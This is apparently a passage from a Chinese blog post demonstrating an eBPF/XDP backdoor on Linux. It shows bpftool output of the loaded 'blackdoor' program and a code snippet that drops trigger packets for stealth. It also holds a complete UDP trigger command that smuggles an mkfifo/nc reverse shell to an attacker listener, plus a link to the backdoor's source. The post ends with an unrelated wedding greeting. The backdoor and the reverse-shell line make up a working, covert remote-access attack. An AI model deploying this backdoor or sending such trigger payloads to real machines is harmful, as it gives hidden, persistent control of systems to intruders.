![](https://mmbiz.qpic.cn/sz_mmbiz_png/pKH4icJWoI5gFzjJkQJnGTl6LDskBBBsHwyPwCDxXHE2oOjJUDuFsuOWrI04lYAzUGYMdR7NYfoxkiabDUvDlelw/640?from=appmsg&wx_fmt=png "")  
  
```
）ip -details link show dev ens332: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 xdpgeneric qdisc fq_codel state UP modeDEFAULTgroupdefault qlen 1000    link/ether 00:0c:29:c9:6a:0e brd ff:ff:ff:ff:ff:ff promiscuity 2 minmtu 46 maxmtu 16110 addrgenmode none numtxqueues 1 numrxqueues 1 gso_max_size 65536 gso_max_segs 65535 parentbus pci parentdev 0000:02:01.0    prog/xdp id191 tag f613144128914cba jited     altname enp2s1root@putao-virtual-machine:~/ebpf/blackdoor# bpftool prog showid191191: xdp name blackdoor_s1mple tag f613144128914cba gpl        loaded_at 2026-01-29T19:50:29+0800  uid 0        xlated 1408B jited 918B memlock 4096B map_ids 33        btf_id 262root@putao-virtual-machine:~/ebpf/blackdoor# bpftool map dump id33[{        "key": 0,        "value": {            "cmd": " TEST_123_PUTAO ",            "processed": 0        }    }]
```  
  
  
上面的格式是符合特定数据包的要求，所以会drop掉，见如下代码  
  
```
bpf_trace_printk(fmt2, sizeof(fmt2), cmd.cmd);    // 存入map    bpf_map_update_elem(&commands, &key, &cmd, BPF_ANY);  // 这里print一下，输出获取到的命令    // 丢弃激活的数据包，增加隐蔽性    return XDP_DROP;
```  
  
  
  
查看是否drop了  
  
这条命令是监听80端口上的数据包，因为符合格式所以被丢弃里，所以这里监听的数据包为0，没有刚才发的那个数据包  
  
```
sudo tcpdump -i ens33 udp port 80 -vvv -X
```  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/pKH4icJWoI5gFzjJkQJnGTl6LDskBBBsHRRt3la2TMUYtpdmY0iaWP0Sa9TNcxe6ibQXG8JICAe4upEdDsiauxnntA/640?from=appmsg&wx_fmt=png "")  
  
  
查看最终效果  
  
  
先运行程序  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/pKH4icJWoI5gFzjJkQJnGTl6LDskBBBsHGWOFWTRBtJPCm5a5jtXAeoKeRGjEdSlkKf8J9aibX7btEQicj6ibTOtvA/640?from=appmsg&wx_fmt=png "")  
  
  
kali上监听端口  
  
  
并发送包含弹shell命令的数据包，命令如下  
  
```
printf %-200s 'HACKE_BY_PUTAOrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.75.128 555 >/tmp/fEND' | nc 192.168.75.133 111 -u
```  
  
  
弹回来了  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/pKH4icJWoI5gFzjJkQJnGTl6LDskBBBsHxj4ibUkjOeFLFLD4KHQSciaKaCho4eVQCy8w2pMe2bakENiahLDqyIiccg/640?from=appmsg&wx_fmt=png "")  
  
代码在  
  
https://github.com/putaomo1i/ebpf_xdp_blackdoor/  
  
  
粗略讲解+演示视频在  
  
  
【初识eBPF/XDP在攻防的作用--可任意端口激活的后门-哔哩哔哩】 https://b23.tv/Ov1AFx5  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/pKH4icJWoI5ia9hl0lkJT5OvF6UicommFcPeg41GH260I1icCjfA7MyAUMqGCrqKXWbAHxVggSiazusaIjGfWHhfXow/640?wx_fmt=jpeg "")  
  
  
最后晒一下今天收到的喜糖，让大家也沾沾福气  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/pKH4icJWoI5gFzjJkQJnGTl6LDskBBBsHicdG9MolVcktkST0iaXVqsx4PsAw18lGR1OfSkjIAOk8rS12Wx2kv1xQ/640?wx_fmt=jpeg "")  
  
祝我哥们结婚快乐，生活美满，工作顺利！！！  
  
  
